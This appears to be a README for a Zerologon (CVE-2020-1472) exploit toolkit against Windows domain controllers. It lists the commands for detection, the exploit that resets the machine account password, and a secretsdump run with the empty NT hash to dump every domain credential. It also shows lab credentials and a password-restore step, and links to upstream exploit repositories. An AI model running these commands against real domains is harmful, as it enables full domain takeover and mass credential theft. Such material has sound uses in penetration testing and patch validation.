## Introduction article
https://www.yuque.com/shamo-vs4ia/vul/ktduf8

## Environmental preparation

pip3 install -r requirements.txt


## Vulnerability detection

python3 zerologon_tester.py ad ad_ip

![image.png](https://cdn.nlark.com/yuque/0/2020/png/1306167/1600170731733-c0c9cf27-1fc0-46b0-901a-aadd0b1c74fe.png#align=left&display=inline&height=92&margin=%5Bobject%20Object%5D&name=image.png&originHeight=184&originWidth=1472&size=59333&status=done&style=none&width=736)
## Exploit

python CVE-2020-1472.py AD AD$ adip
![image.png](https://cdn.nlark.com/yuque/0/2020/png/1306167/1600178770795-a30845d6-9d29-4591-bb22-06f7609eb064.png#align=left&display=inline&height=331&margin=%5Bobject%20Object%5D&name=image.png&originHeight=662&originWidth=2294&size=164300&status=done&style=none&width=1147)


secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'god.org/owa2010cn-god$@192.168.3.21'
![image.png](https://cdn.nlark.com/yuque/0/2020/png/1306167/1600179441038-960a23e9-f411-4d07-8515-1d756347ddfe.png#align=left&display=inline&height=627&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1254&originWidth=2286&size=506909&status=done&style=none&width=1143)
![image.png](https://cdn.nlark.com/yuque/0/2020/png/1306167/1600179455155-e9850290-7c1a-4e24-b039-403c201c5ae2.png#align=left&display=inline&height=548&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1096&originWidth=1878&size=539556&status=done&style=none&width=939)

Successfully exported all hashes

## Hash

before：
secretsdump.py god.org/administrator:Admin12345@ad_ip -just-dc-user 'AD$'

![image.png](https://cdn.nlark.com/yuque/0/2020/png/1306167/1600178285199-11cc5da7-001c-4fb0-aa06-a2ba8e1722f1.png#align=left&display=inline&height=203&margin=%5Bobject%20Object%5D&name=image.png&originHeight=406&originWidth=2326&size=152637&status=done&style=none&width=1163)

after：
secretsdump.py god.org/administrator:Admin12345@ad_ip -just-dc-user 'AD$'

![image.png](https://cdn.nlark.com/yuque/0/2020/png/1306167/1600178878708-d96192c4-f276-4870-9df2-704c7f9ca89a.png#align=left&display=inline&height=557&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1114&originWidth=2400&size=411905&status=done&style=none&width=1200)

## restorepassword
python3 reinstall_original_pw.py ad_hostname ad_ip hash
![image.png](https://cdn.nlark.com/yuque/0/2020/png/1306167/1600181539706-1f601acd-3cb4-4ddf-a7a3-cbace89ca20a.png#align=left&display=inline&height=380&margin=%5Bobject%20Object%5D&name=image.png&originHeight=760&originWidth=2370&size=239530&status=done&style=none&width=1185)


## Collected from
https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472

https://github.com/risksense/zerologon

https://github.com/VoidSec/CVE-2020-1472

https://github.com/dirkjanm/CVE-2020-1472

https://github.com/SecuraBV/CVE-2020-1472
